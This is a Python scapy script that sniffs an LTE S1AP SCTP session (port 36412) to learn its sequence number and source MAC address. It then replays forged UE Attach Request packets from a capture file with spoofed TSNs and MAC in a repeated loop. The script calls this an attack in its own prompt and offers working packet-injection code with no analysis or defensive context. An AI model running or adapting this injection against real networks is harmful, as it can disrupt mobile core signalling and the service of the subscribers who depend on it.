import time
from scapy.all import *
import sys

count = int(sys.argv[1])
timeout = 30  # Timeout in seconds to capture packets
source_mac = None
initial_tsn = None
captured_packets = []  # List to store captured packets
received_valid_packet = False  # Flag to track whether the message was printed

def extract_initial_values(packet):
    initial_tsn = packet[SCTP].tsn
    source_mac = packet[Ether].src
    return initial_tsn, source_mac

def modify_packet(packet, new_tsn, new_mac):
    if SCTP in packet:
        sctp_header = packet[SCTP]
        tsn = new_tsn
        sctp_header.tsn = tsn
        modified_packet = packet.copy()
        # Replace source MAC address
        modified_packet[Ether].src = new_mac

        print("Modified Packet's TSN:", tsn)
        print()
        return modified_packet

def modify_and_send_packets(packets, count, initial_tsn, source_mac):
    new_tsn = initial_tsn + 1  # Increment the initial TSN

    for _ in range(count):
        modified_packets = []
        for i, packet in enumerate(packets):
            print("Modifying Packet", i + 1)
            modified_packet = modify_packet(packet, new_tsn, source_mac)
            modified_packets.append(modified_packet)
            new_tsn += 1  # Increment the TSN for the next packet

        sendp(modified_packets, iface="eth1")
        time.sleep(0.1)  # Optional delay between sending packets

print("Sniffing traffic for SCTP")

def sniff_sctp(packet):
    global captured_packets
    global received_valid_packet
    
    if not received_valid_packet and SCTP in packet:
        captured_packets.append(packet)
        received_valid_packet = True  # Set the flag to True
        print("Received valid SCTP packet - Press Control ^C to continue attack")
        # Option to print received SCTP packet layers
#        print(packet.show())

try:
    sniff(iface="eth2", filter="sctp port 36412", prn=sniff_sctp, timeout=timeout)
except KeyboardInterrupt:
    pass

if not captured_packets:
    print("No valid SCTP data packets were captured.")
else:
    packet = captured_packets[0]
    initial_tsn, source_mac = extract_initial_values(packet)
    print("Captured Initial TSN:", initial_tsn)
    print("Captured Source MAC:", source_mac)

    input("Press Enter to initiate transmission of modified packets...")

    input_file = 'UE-Attach-Request.pcap'
    packets = rdpcap(input_file)
    modify_and_send_packets(packets, count, initial_tsn, source_mac)
